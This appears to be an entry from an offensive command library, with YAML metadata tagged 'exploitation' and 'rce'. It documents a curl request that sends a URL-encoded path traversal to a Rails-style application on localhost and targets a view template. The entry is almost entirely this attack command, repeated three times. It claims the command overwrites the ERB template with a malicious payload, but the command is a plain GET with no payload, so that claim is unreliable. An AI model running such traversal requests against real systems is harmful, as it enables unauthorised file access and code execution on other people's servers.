---
data: >-
  curl
  "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
tags:
  - exploitation
  - rce
type: command
output: 'Response, ERB template overwritten'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.354Z'
id: 27092552-97cc-4aa6-8412-2b38f2f24145
verified: false
validated: true
submitted: true
---
# curl-traversal-erb-overwrite

## Command

```bash
curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
```

## Description

Overwrites ERB template with malicious payload via traversal.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Encoded URL with format=text | Target template | Yes |

## Examples

### Basic Usage

```bash
curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
```

## Expected Output

Template updated.

## Related

- [[commands/cat-erb-template]]
